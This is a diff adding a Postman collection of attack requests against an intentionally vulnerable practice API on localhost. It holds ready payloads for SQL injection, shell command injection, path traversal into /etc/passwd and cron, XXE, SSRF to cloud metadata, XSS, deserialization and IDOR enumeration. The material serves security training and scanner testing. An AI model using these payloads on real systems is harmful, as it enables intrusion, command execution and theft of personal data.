@@ -1,0 +1,521 @@
+{
+  "info": {
+    "name": "VulnerableApi - Security Scanning Practice",
+    "_postman_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "description": "Intentionally vulnerable ASP.NET Core API. Use only against your local instance. Each request is pre-loaded with a malicious payload that exercises the corresponding CWE.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:5080" }
+  ],
+  "item": [
+    {
+      "name": "SQL Injection",
+      "item": [
+        {
+          "name": "GetUser - tautology (CWE-89)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/sqlinjection/user?username=' OR '1'='1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sqlinjection", "user"],
+              "query": [
+                { "key": "username", "value": "' OR '1'='1" }
+              ]
+            },
+            "description": "Classic SQL injection - tautology bypass via concatenated WHERE clause."
+          }
+        },
+        {
+          "name": "Search - UNION based (CWE-89)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/sqlinjection/search?term=a%' UNION SELECT name, type, id FROM sysobjects --",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sqlinjection", "search"],
+              "query": [
+                { "key": "term", "value": "a%' UNION SELECT name, type, id FROM sysobjects --" }
+              ]
+            },
+            "description": "String interpolation sink. The endpoint echoes the constructed SQL in the response so you can see the injection regardless of whether a DB is connected."
+          }
+        },
+        {
+          "name": "Login - error-based + auth bypass (CWE-89, CWE-209)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin' --\",\n  \"password\": \"anything\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/sqlinjection/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sqlinjection", "login"]
+            },
+            "description": "SQL auth bypass with comment terminator. Server also leaks full exception text on errors."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Command Injection",
+      "item": [
+        {
+          "name": "Ping - shell metachar injection (CWE-78)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/commandinjection/ping?host=127.0.0.1;id",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "commandinjection", "ping"],
+              "query": [
+                { "key": "host", "value": "127.0.0.1;id" }
+              ]
+            },
+            "description": "Input is concatenated into '/bin/sh -c'. The ';id' runs after ping."
+          }
+        },
+        {
+          "name": "Ping - command substitution (CWE-78)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/commandinjection/ping?host=$(whoami)",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "commandinjection", "ping"],
+              "query": [
+                { "key": "host", "value": "$(whoami)" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Nslookup - chained command (CWE-78)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/commandinjection/nslookup?domain=example.com & whoami",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "commandinjection", "nslookup"],
+              "query": [
+                { "key": "domain", "value": "example.com & whoami" }
+              ]
+            },
+            "description": "Windows-style command chain. On Linux this won't actually run cmd.exe, but the sink is still flagged by SAST."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Path Traversal",
+      "item": [
+        {
+          "name": "Read - dot-dot escape (CWE-22)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/pathtraversal/read?filename=../../../../etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "pathtraversal", "read"],
+              "query": [
+                { "key": "filename", "value": "../../../../etc/passwd" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Write - arbitrary file write (CWE-73)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"pwned\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/pathtraversal/write?filename=../../etc/cron.d/pwn",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "pathtraversal", "write"],
+              "query": [
+                { "key": "filename", "value": "../../etc/cron.d/pwn" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Extract - Zip Slip (CWE-22)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"cHduZWQ=\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/pathtraversal/extract?entryName=../../../../tmp/zipslip.txt",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "pathtraversal", "extract"],
+              "query": [
+                { "key": "entryName", "value": "../../../../tmp/zipslip.txt" }
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "XSS / Log Injection",
+      "item": [
+        {
+          "name": "Hello - reflected XSS (CWE-79)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/hello?name=<script>alert('xss')</script>",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "hello"],
+              "query": [
+                { "key": "name", "value": "<script>alert('xss')</script>" }
+              ]
+            },
+            "description": "Open the request URL in a browser to see the script fire."
+          }
+        },
+        {
+          "name": "Log - log injection / forging (CWE-117)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/log?message=hello%0A[ERROR] forged log line - admin password reset",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "log"],
+              "query": [
+                { "key": "message", "value": "hello\n[ERROR] forged log line - admin password reset" }
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "XXE",
+      "item": [
+        {
+          "name": "Parse - external entity file read (CWE-611)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"file:///etc/hostname\\\">]><r>&x;</r>\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/xxe/parse",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xxe", "parse"]
+            }
+          }
+        },
+        {
+          "name": "Parse - SSRF via XXE (CWE-611 + CWE-918)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"http://169.254.169.254/latest/meta-data/\\\">]><r>&x;</r>\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/xxe/parse",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xxe", "parse"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "SSRF / Open Redirect",
+      "item": [
+        {
+          "name": "Fetch - file scheme (CWE-918)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/ssrf/fetch?url=file:///etc/hostname",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "ssrf", "fetch"],
+              "query": [
+                { "key": "url", "value": "file:///etc/hostname" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Fetch - cloud metadata (CWE-918)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/ssrf/fetch?url=http://169.254.169.254/latest/meta-data/",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "ssrf", "fetch"],
+              "query": [
+                { "key": "url", "value": "http://169.254.169.254/latest/meta-data/" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Fetch - internal localhost (CWE-918)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/ssrf/fetch?url=http://127.0.0.1:8080/admin",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "ssrf", "fetch"],
+              "query": [
+                { "key": "url", "value": "http://127.0.0.1:8080/admin" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Redirect - open redirect (CWE-601)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/ssrf/redirect?next=https://evil.example.com",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "ssrf", "redirect"],
+              "query": [
+                { "key": "next", "value": "https://evil.example.com" }
+              ]
+            },
+            "description": "Postman follows redirects by default. Disable redirect-following in Settings to inspect the 302."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Insecure Deserialization",
+      "item": [
+        {
+          "name": "JSON - TypeNameHandling.All gadget (CWE-502)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"{\\\"$type\\\":\\\"System.IO.FileInfo, System.IO.FileSystem\\\",\\\"fileName\\\":\\\"/etc/passwd\\\"}\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/deserialization/json",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "deserialization", "json"]
+            },
+            "description": "Demonstrates polymorphic type instantiation through $type. SAST flags the TypeNameHandling.All sink regardless of whether a real gadget chain is reachable on this runtime."
+          }
+        },
+        {
+          "name": "Binary - BinaryFormatter (CWE-502)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/octet-stream" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "AAEAAAD/////AQAAAAAAAAAMAgAAAA9TZW5kIGFueSBieXRlcw=="
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/deserialization/binary",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "deserialization", "binary"]
+            },
+            "description": "Sends arbitrary bytes to a BinaryFormatter sink. Will throw at runtime, but the sink itself is the vulnerability scanners flag."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Weak Crypto",
+      "item": [
+        {
+          "name": "MD5 hash (CWE-327)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/crypto/md5?input=password",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "crypto", "md5"],
+              "query": [
+                { "key": "input", "value": "password" }
+              ]
+            }
+          }
+        },
+        {
+          "name": "SHA-1 password hash (CWE-327)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"hunter2\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/crypto/hash-password",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "crypto", "hash-password"]
+            }
+          }
+        },
+        {
+          "name": "DES encrypt with static IV (CWE-327, CWE-329)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"top secret payload\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/crypto/encrypt",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "crypto", "encrypt"]
+            }
+          }
+        },
+        {
+          "name": "AES-ECB with hardcoded key (CWE-326, CWE-327)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "\"AAAAAAAAAAAAAAAAAAAAAAAA\""
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/crypto/aes-ecb",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "crypto", "aes-ecb"]
+            }
+          }
+        },
+        {
+          "name": "Insecure Random token (CWE-338)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/crypto/token",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "crypto", "token"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Auth / IDOR",
+      "item": [
+        {
+          "name": "Admin login - hardcoded creds (CWE-798)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 200) {",
+                  "  const json = pm.response.json();",
+                  "  if (json && json.token) {",
+                  "    pm.collectionVariables.set('adminToken', json.token);",
+                  "    console.log('Saved adminToken =', json.token);",
+                  "  }",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/admin-login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "admin-login"]
+            },
+            "description": "Hardcoded credentials in source. Token is also predictable (username + UTC ticks)."
+          }
+        },
+        {
+          "name": "Profile - IDOR by ID (CWE-639)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/profile/1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "profile", "1"]
+            }
+          }
+        },
+        {
+          "name": "Profile - enumerate other user (CWE-639)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/profile/2",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "profile", "2"]
+            },
+            "description": "No authorization check. Iterate IDs to harvest PII."
+          }
+        }
+      ]
+    }
+  ]
+}
